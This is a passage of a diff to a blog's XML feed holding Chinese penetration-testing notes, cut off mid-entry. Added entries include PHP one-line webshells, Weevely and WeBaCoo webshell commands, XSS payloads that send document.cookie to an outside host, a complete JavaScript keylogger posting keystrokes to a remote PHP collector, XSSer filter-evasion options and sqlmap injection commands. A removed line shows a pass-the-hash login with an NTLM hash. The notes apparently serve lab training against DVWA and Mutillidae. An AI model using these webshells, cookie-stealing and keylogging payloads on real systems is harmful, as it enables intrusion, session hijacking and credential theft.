hash密文远程登录windows"></a><strong>利用sam hash密文远程登录windows</strong></h4><pre><code>pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8 //1.1.1.1 cmd</code></pre>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 密码攻击 </category>
-          
-          <category> 嗅探欺骗 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> arpspoof </tag>
-            
-            <tag> Ettercap </tag>
-            
-            <tag> PTH </tag>
-            
-            <tag> dnsspoof </tag>
-            
-            <tag> 中间人攻击 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>使用ARP和DNS欺骗实现流量劫持密码嗅探</title>
       <link href="/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
       <url>/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</url>
@@ -1344,11 +1640,11 @@
             
             <tag> arpspoof </tag>
             
-            <tag> dnsspoof </tag>
-            
             <tag> driftnet </tag>
             
             <tag> dsniff </tag>
+            
+            <tag> dnsspoof </tag>
             
         </tags>
       
@@ -1629,6 +1925,136 @@
     
     
     <entry>
+      <title>一句话木马及Kali常用WebShell</title>
+      <link href="/2014/05/26/Web_Attacks/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%8A%E5%B8%B8%E7%94%A8WebShell/"/>
+      <url>/2014/05/26/Web_Attacks/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8F%8A%E5%B8%B8%E7%94%A8WebShell/</url>
+      
+        <content type="html"><![CDATA[<h4 id="PHP一句话webshell"><a href="#PHP一句话webshell" class="headerlink" title="PHP一句话webshell"></a>PHP一句话webshell</h4><pre><code>&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]);?&gt;&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</code></pre><ul><li><p>中国菜刀: <code>http://www.maicaidao.co/</code></p></li><li><p>可能被IDS,AV,WAF,扫描器软件发现查杀</p></li><li><p><strong>WeBaCoo</strong> (Web Backdoor Cookie)</p><ul><li>类终端的shell</li><li>编码通信内容通过cookie头传输,隐蔽性较强</li><li>cm:base64编码的命令</li><li>cn:服务器用于返回数据的cookie头的名</li><li>cp:返回信息定界符</li></ul></li><li><p>生成服务端</p><ul><li>webacoo -g -o a.php</li><li>客户端连接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webacoo -t -u http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><strong>Weevely</strong><ul><li>隐蔽的类终端PHP Webshell</li><li>30多个管理模块<ul><li>执行系统命令,浏览文件系统</li><li>检查服务器常见配置错误</li><li>创建正向,反向TCP Shell连接</li><li>通过目标计算机代理HTTP流量</li><li>从目标计算机运行端口扫描,渗透内网</li></ul></li><li>支持连接密码</li><li>Kali缺少库  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pypl.python.org&#x2F;pypi&#x2F;PySocks&#x2F;</span><br><span class="line">.&#x2F;setup.py install</span><br></pre></td></tr></table></figure></li><li>生成服务端  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;password&gt; b.php</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;weevely&#x2F;b.php</span><br></pre></td></tr></table></figure></li><li>客户端连接服务器  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;1.1.1.1&#x2F;b.php &lt;password&gt;id</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> Web渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> webshell </tag>
+            
+            <tag> 中国菜刀 </tag>
+            
+            <tag> webacoo </tag>
+            
+            <tag> weevely </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>存储型XSS和DOM型XSS</title>
+      <link href="/2014/05/25/Web_Attacks/XSS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%92%8CDOM%E5%9E%8BXSS/"/>
+      <url>/2014/05/25/Web_Attacks/XSS/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%92%8CDOM%E5%9E%8BXSS/</url>
+      
+        <content type="html"><![CDATA[<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a><strong>存储型XSS</strong></h4><ul><li><p>长期存储于服务器端</p></li><li><p>每次用户访问都会被执行javascript脚本</p></li><li><p>Name:客户端表单长度限制</p><ul><li>客户端,截断代理</li><li><code>&lt;script src=http://1.1.1.1/a.js&gt;&lt;/script&gt;</code></li><li>a.js源码  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var img &#x3D; new Image(); </span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;1.1.1.1:88&#x2F;cookies.php?cookie&#x3D;&quot;+document.cookie;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a><strong>DOM型XSS</strong></h4><ul><li>一套JS和其它语言可调用的标准的API  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PageDocument object</span><br><span class="line">Element1obj1</span><br><span class="line">Element2obj2</span><br><span class="line">Element3obj3</span><br><span class="line"></span><br><span class="line">&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F; 192.168.20.8:88&#x2F;log?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> Web渗透 </category>
+          
+          <category> XSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+            <tag> 跨站脚本漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>反射型XSS跨站脚本漏洞检测和攻击利用</title>
+      <link href="/2014/05/24/Web_Attacks/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/"/>
+      <url>/2014/05/24/Web_Attacks/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h4 id="XSS跨站脚本漏洞检测和攻击利用"><a href="#XSS跨站脚本漏洞检测和攻击利用" class="headerlink" title="XSS跨站脚本漏洞检测和攻击利用"></a><strong>XSS跨站脚本漏洞检测和攻击利用</strong></h4><ul><li>攻击WEB客户端</li><li>客户端脚本语言<ul><li>弹窗告警,广告</li><li>Javascript</li><li>在浏览器中执行</li></ul></li></ul><p><strong>XSS</strong>(cross-site scripting)</p><ul><li><p>通过WEB站点漏洞,向客户端交付恶意脚本代码,实现对客户端的攻击目的</p></li><li><p>注入客户端脚本代码</p></li><li><p>盗取cookie</p></li><li><p>重定向</p></li><li><p>VBScript,Activex,or Flash</p></li><li><p><strong>JavaScript</strong></p><ul><li>与Java语言无关</li><li>命名完全出于市场因素</li><li>使用最广的客户端脚本语言</li></ul></li><li><p>使用场景</p><ul><li>直接嵌入html: <code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li><li>元素标签事件: <code>&lt;body onload=alert(&#39;XSS&#39;)&gt;</code></li><li>图片标签: <code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></li><li>其它标签: <code>&lt;iframe&gt;,&lt;div&gt;,and &lt;link&gt;</code></li><li>DOM对象,篡改页面内容</li></ul></li></ul><p><strong>攻击参与方</strong><br>    * 攻击者<br>    * 被攻击者<br>    * 漏洞站点<br>    * 第三方站点(攻击目标,攻击参与站)</p><p><strong>漏洞形成的根源</strong><br>    * 服务器对用户提交数据过滤不严<br>    * 提交给服务器的脚本被直接返回给其他客户端执行<br>    * 脚本在客户端执行恶意操作</p><h4 id="XSS漏洞类型"><a href="#XSS漏洞类型" class="headerlink" title="XSS漏洞类型"></a><strong>XSS漏洞类型</strong></h4><ul><li>存储型(持久型)</li><li>反射型(非持久)</li><li>DOM型</li></ul><p><strong>漏洞PoC</strong></p><ul><li><p>检测漏洞存在</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&#39;&#39; onclick&#x3D;alert(&#39;xss&#39;)&gt;type&lt;&#x2F;a&gt;</span><br><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.jpg onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure></li><li><p>重定向</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location&#x3D;&#39;http:&#x2F;&#x2F;1.1.1.1&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;iframe SRC&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;victim&quot; height &#x3D; &quot;0&quot; width &#x3D;&quot;0&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>篡改页面</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.body.innerHTML&#x3D;&quot;&lt;div style&#x3D;visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&quot;;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>Cookie窃取</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;c.php? output&#x3D;&quot;+document.cookie;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.js&gt;&lt;&#x2F;script&gt; </span><br><span class="line">a.js源码</span><br><span class="line">var img &#x3D; new Image();</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;cookies.php?cookie&#x3D;&quot;+document.cookie;</span><br></pre></td></tr></table></figure></li><li><p><code>Keylogger.js</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress&#x3D;function(evt)&#123;</span><br><span class="line">evt&#x3D;evt || window.event</span><br><span class="line">key&#x3D;String.fromCharCode(evt.charCode)</span><br><span class="line">if(key)&#123;</span><br><span class="line">var http&#x3D;new XMLHttpRequest();</span><br><span class="line">var param&#x3D;encodeURI(key)</span><br><span class="line">http.open(&quot;POST&quot;,&quot;http:&#x2F;&#x2F;192.168.190.163&#x2F;keylogger.php&quot;,true);</span><br><span class="line">http.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class="line">http.send(&quot;keky&#x3D;&quot;+param);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>Keylogger.php</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$key&#x3D;$_POST[&#39;key&#39;];</span><br><span class="line">$logfile&#x3D;&quot;keylog.txt&quot;;</span><br><span class="line">$fp&#x3D;fopen($logfile,&quot;a&quot;);</span><br><span class="line">fwrite($fp,$key);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script+src&#x3D;&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;keylogger.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;192.168.20.10&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_r&#x2F;?name&#x3D;&lt;script +src&#x3D;&#39;http:&#x2F;&#x2F;192.168.20.8&#x2F;keylogger.js&#39;&gt;&lt;&#x2F;script&gt;&quot;&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Xsser"><a href="#Xsser" class="headerlink" title="Xsser"></a><strong>Xsser</strong></h4><ul><li><p>命令行/图形化工具</p></li><li><p>绕过服务器端输入筛选</p><ul><li>10进制/16进制编码</li><li>unescape()<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xsser -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;&quot; -g &quot;xss_r&#x2F;?name&#x3D;&quot; -cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;d23e469411707ff8210717e67c521a81&quot; -s -v  --reverse-check</span><br><span class="line"></span><br><span class="line">--heuristic 检查被过滤的字符</span><br></pre></td></tr></table></figure></li></ul></li><li><p>对payload编码,绕过服务器端筛选过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">--Str     Use method String.FromCharCode()</span><br><span class="line">--Une   Use Unescape() function</span><br><span class="line">--Mix   Mix String.FromCharCode() and Unescape()</span><br><span class="line">--Dec   Use Decimal encoding</span><br><span class="line">--Hex   Use Hexadecimal encoding</span><br><span class="line">--Hes   Use Hexadecimal encoding, with semicolons</span><br><span class="line">--Dwo   Encode vectors IP addresses in DWORD</span><br><span class="line">--Doo   Encode vectors IP addresses in Octal</span><br><span class="line">--Cem&#x3D;CEM Try -manually- different Character Encoding Mutations </span><br><span class="line">(reverse obfuscation: good) -&gt; (ex: &#39;Mix,Une,Str,Hex&#39;)</span><br><span class="line">注入技术(多选)</span><br><span class="line">--Coo   Cross Site Scripting Cookie injection</span><br><span class="line">--Xsa   Cross Site Agent Scripting</span><br><span class="line">--Xsr    Cross Site Referer Scripting</span><br><span class="line">--Dcp   Data Control Protocol injections</span><br><span class="line">--Dom   Document Object Model injections</span><br><span class="line">--Ind   HTTP Response Splitting Induced code</span><br><span class="line">--Anchor  Use Anchor Stealth payloader (DOM shadows!)</span><br><span class="line">--Phpids  PHP - Exploit PHPIDS bug (0.6.5) to bypass filters</span><br><span class="line">--Doss   XSS Denial of service (server) injection</span><br><span class="line">--Dos   XSS Denial of service (client) injection</span><br><span class="line">--B64   Base64 code encoding in META tag (rfc2397)</span><br><span class="line">--Onm   ONM - Use onMouseMove() event to inject code</span><br><span class="line">--Ifr    Use &lt;iframe&gt; source tag to inject code</span><br></pre></td></tr></table></figure></li></ul><p><code>htmlspecialchars()</code></p><ul><li>输出html编码&lt; &gt; &lt; &gt;<br><code>xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; -cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> Web渗透 </category>
+          
+          <category> XSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+            <tag> Xsser </tag>
+            
+            <tag> 跨站脚本漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>BEFF浏览器XSS攻击框架</title>
+      <link href="/2014/05/23/Web_Attacks/XSS/BeFF%E6%B5%8F%E8%A7%88%E5%99%A8XSS%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/"/>
+      <url>/2014/05/23/Web_Attacks/XSS/BeFF%E6%B5%8F%E8%A7%88%E5%99%A8XSS%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/</url>
+      
+        <content type="html"><![CDATA[<h4 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a><strong>BEEF</strong></h4><ul><li><p>浏览器攻击面</p><ul><li>应用普遍转移到B / S架构,浏览器成为统一客户端程序</li><li>结合社会工程学方法对浏览器进行攻击</li><li>攻击浏览器用户</li><li>通过注入的JS脚本,利用浏览器攻击其它网站</li></ul></li><li><p>BEEF(Browser exploitation framework)</p><ul><li>生成,交付payload</li><li>Ruby语言编写</li><li>服务器端:管理hooked客户端</li><li>客户端:运行于客户端浏览器的Javascript脚本(hook)</li></ul></li><li><p>攻击手段</p><ul><li>利用网站xss漏洞实现攻击</li><li>诱使客户端访问含有hook的伪造站点</li><li>结合中间人攻击注入hook脚本</li></ul></li><li><p>常见用途</p><ul><li>键盘纪录器</li><li>网络扫描</li><li>浏览器信息收集</li><li>绑定shell</li><li>与metasploit集成</li></ul></li><li><p>演示页面: <code>http://&lt;IP_BeEF_Server&gt;:3000/demos/basic.html</code></p></li><li><p>Details:</p><ul><li>浏览器,插件版本信息；操作系统信息</li></ul></li><li><p>Logs:</p><ul><li>浏览器动作:焦点变化,鼠标点击,信息输入</li></ul></li><li><p>Commands:命令模块</p><ul><li>绿色模块:表示模块适合目标浏览器,并且执行结果被客户端不可见</li><li>红色模块:表示模块不适用于当前用户,有些红色模块也可正常执行</li><li>橙色模块:模块可用,但结果对用户可见(CAM弹窗申请权限等)</li><li>灰色模块:模块未在目标浏览器上测试过</li></ul></li><li><p><strong>主要模块</strong></p><ul><li>Browsers</li><li>Exploits</li><li>Host</li><li>Persistence        #持久化</li><li>Network</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> Web渗透 </category>
+          
+          <category> XSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XSS </tag>
+            
+            <tag> BEFF </tag>
+            
+            <tag> Ruby </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>AJAX技术组合及WebService安全考虑</title>
       <link href="/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/"/>
       <url>/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/</url>
@@ -1725,8 +2151,8 @@
     
     <entry>
       <title>SQLMAP自动注入参数详解</title>
-      <link href="/2014/05/06/Web_Attacks/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
-      <url>/2014/05/06/Web_Attacks/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
+      <link href="/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
+      <url>/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
       
         <content type="html"><![CDATA[<blockquote><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a><strong>SQLMAP自动注入</strong></h4><p>开源sql注入漏洞检测,利用工具<br>检测动态页面中get/post参数,cookie,http头<br>数据榨取<br>文件系统访问<br>操作系统命令行<br>引擎强大,特性丰富<br>XSS漏洞检测</p></blockquote><h5 id="五种漏洞检测技术"><a href="#五种漏洞检测技术" class="headerlink" title="五种漏洞检测技术"></a><strong>五种漏洞检测技术</strong></h5><ul><li><p>基于布尔的盲注检测</p></li><li><p>基于时间的盲注检测<br>  <code>&#39; and (select * from (select(sleep(20)))a)--+</code></p></li><li><p>基于错误的检测</p></li><li><p>基于UNION联合查询的检测<br>  <em>适用于通过循环直接输出联合查询结果,否则只显示每一项结果</em></p></li><li><p>基于堆叠查询的检测<br>  <em>;堆叠多个查询语句</em><br>  <em>适用于非select的数据修改,删除的操作</em></p></li><li><p>支持的数据库管理系统DBMS<br>  <code>MYSQL,Oracle,PostgreSQL Server,Microsoft Access,IBM DB2,SQLite,Firebird,Sybase,SAP MaxDB</code></p></li></ul><h4 id="其它特性"><a href="#其它特性" class="headerlink" title="其它特性"></a><strong>其它特性</strong></h4><p>数据库直接连接 -d<br>    不通过SQL注入,制定身份认证信息,IP,端口<br>与burpsuite,google结合使用,支持正则表达式限定测试目标<br>Get,post,cookie,Referer,User-Agent(随机或指定)<br>    Cookie过期后自动处理Set-Cookie头,更新cookie信息<br>限速:最大并发,延迟发送<br>支持Basic,Digest,NTLM,CA身份认证<br>数据库版本,用户,权限,hash枚举和字典破解,暴力破解表列名称<br>文件上传下载,UDF,启动并执行储存过程,操作系统命令执行,访问windows注册表<br>与w3af,metasploit集成结合使用,基于数据库服务进程提权和上传执行后门</p><p><strong>基于python2.7 开发</strong></p><p><strong>安装</strong></p><pre><code>apt-get install gitgit clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></pre><p><strong>升级</strong></p><pre><code>sqlmap --update        #在线git pull            #离线Kali集成版随kali库更新</code></pre><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h4><pre><code>sqlmap -h &amp; -hhsqlmap -d &quot;mysql://root:@192.168.190.163:3306/dvwa&quot; -f --users --banner --dbs --schema -asqlmap --version -v</code></pre><p><strong>日志</strong><br>    <code>.sqlmap</code><br><strong>输出</strong></p><ul><li>输出内容详细度分7个等级</li></ul><p><strong>Get方法</strong></p><pre><code>sqlmap -u &quot;http://192.168.190.163/mutillidae/index.php?page=userinfo.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View +Account+Details&quot; -p username -f</code></pre><p><strong>扫描URL列表文件</strong></p><pre><code>http://1.1.1.1/vuln1.php?q=foobarhttp://1.1.1.1/vuln3/id/1*sqlmap -m list.txt</code></pre><p><strong>扫描google搜索结果</strong></p><pre><code>sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></pre><p><strong>POST方法</strong></p><pre><code>使用http请求文件(burpsuite)    sqlmap -r request.txt使用burpsuite log文件    sqlmap -l log.txt</code></pre><p><strong>HTTPS</strong></p><pre><code>sqlmap -u &quot;https://1.1.1.1/a.php?id=1:8843&quot; --force-ssl</code></pre><p><strong>扫描配置文件</strong></p><pre><code>sqlmap -c sqlmap.conf</code></pre><h4 id="SQLMAP自动注入—Request"><a href="#SQLMAP自动注入—Request" class="headerlink" title="SQLMAP自动注入—Request"></a><strong>SQLMAP自动注入—Request</strong></h4><pre><code>数据段:    --dataget / post都适用splmap -u &quot;http://1.1.1.1/a.php&quot; --data&quot;user=1&amp;pass=2&quot; -f变量分隔符: --param-delhttp://1.1.1.1/a.php?q=foo;id=1        // ; &amp;sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -fcookie头: --cookieweb应用需要基于cookie的身份认证检查cookie中的注入点(level&gt;=2)Set-Cookie / --drop-set-cookie / --cookie-delsqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f--user-agent    sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)     #默认user-agent--random-agent        #随机user-agent    /usr/share/sqlmap/txt/user-agents.txt sqlmap检查user-agent中的注入点:Level&gt;=3APP/WAF/IPS/IDS过滤异常user-agent时报错    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP status code, try to force the HTTP User-Agent header with option --useragent or --random-agentHost头: --host=&quot;&quot;Level 5Referer头:    --referrerLevel&gt;=3定义的header: --headers每个头单独一行(名称区分大小写)*sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --headers=&quot;host:www.a.com\nUser-Agent:owl&quot;--method=GET/POST</code></pre><p><strong>基于HTTP协议的身份验证</strong></p><ul><li>Basic</li><li>Digest</li><li>NTLM<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php?id&#x3D;1&quot; --auth-type Basic --auth-cred &quot;user:pass&quot;</span><br><span class="line"></span><br><span class="line">--auth-cert &#x2F; --auth-file</span><br><span class="line">&#96;--auth-file&#x3D;&quot;ca.PEM&quot;&#96;</span><br><span class="line"> 有私钥的PEM格式证书文件</span><br><span class="line">PEM格式的证书链文件</span><br></pre></td></tr></table></figure></li></ul><p><strong>http(s)代理</strong></p><pre><code>--proxy=&quot;http://127.0.0.1:8087/&quot;--proxy-cred=&quot;name:pass&quot;--ignore-proxy    忽略系统级代理设置,通常用于扫描本地网络目标sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --proxy=&quot;http://127.0.0.1:8087&quot; -f--delay    每次http(s)请求之间,浮点数,单位为秒,默认无延迟--timeout    请求超时时间,浮点数,默认为30秒--retries    http(s)连接超时重试次数,默认3次--randomize    长度,类型与原始值保持一致的前提下,指定每次请求随机取值的参数名        sqlmap -u http://1.1.1.1/a.php?id=100 -randomize=&quot;id&quot;--scope    过滤日志内容,通过正则表达式筛选扫描对象    sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;    sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs    User-agent中的注入点--safe-url / --safe-freq    检测和盲注阶段会产生大量失败请求,服务器端可能因此销毁session    每发送--safe-freq次注入请求后,发送一次正常请求--skip-urlencode    默认Get方法会对传输内容进行编码,某些WEB服务器不遵守RFC标准编码,使用原始字符提交数据--eval    每次请求前执行指定的python代码    每次请求更改或增加新的参数值(时间依赖,其他参数值依赖)    sqlmap -u &quot;http://1.1.1.1/a.php? id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></pre><h4 id="SQLMAP自动注入—Optimization-优化参数"><a href="#SQLMAP自动注入—Optimization-优化参数" class="headerlink" title="SQLMAP自动注入—Optimization    #优化参数"></a><strong>SQLMAP自动注入—Optimization</strong>    #优化参数</h4><p><strong>优化性能</strong></p><pre><code>--predict-output    根据检测方法,比对返回值和统计表内容,不断缩小检测范围,提高检测效率    版本名,用户名,密码,Privileges,role,数据库名称,表名,列名与--threads参数不兼容    统计表:/usr/share/sqlmap/txt/common-outputs.txt--keep-alive    使用http(s)长连接,性能好    与--proxy参数不兼容    长连接避免重复建立连接的网络开销,但大量长连接会严重占用服务器资源--null-connection    只获取相应页面的大小值,而非页面具体内容    通常用于盲注判断 真/假,降低网络带宽消耗    与--text-only参数不兼容(基于页面内容的比较判断 真/假)--threads    最大并发线程    盲注时每个线程获取一个字符(7次请求),获取完成后线程结束    默认值为1,建议不要超过10,否则可能影响站点可用性    与--predict-output参数不兼容-o    开启前三个性能参数(除--threads参数)</code></pre><h4 id="SQLMAP自动注入—Injection-注入"><a 